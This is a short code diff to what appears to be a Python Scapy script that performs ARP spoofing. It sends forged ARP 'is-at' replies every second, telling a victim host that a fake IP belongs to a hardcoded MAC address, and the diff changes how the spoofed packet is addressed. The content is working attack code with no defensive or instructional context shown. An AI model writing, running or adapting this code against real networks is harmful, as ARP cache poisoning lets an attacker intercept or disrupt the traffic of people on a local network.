@@ -19,11 +19,12 @@ fakeIp=args.fakeIp
 
 while True:
     send(
-        Ether(dst="ff:ff:ff:ff:ff:ff")/
         ARP(
             op="is-at",
             psrc=fakeIp, 
             pdst=victimeIp,
+            hwdst = "ff:ff:ff:ff:ff:ff",
+            hwsrc = "08:00:27:93:cf:20"
             )
         )
     time.sleep(1)
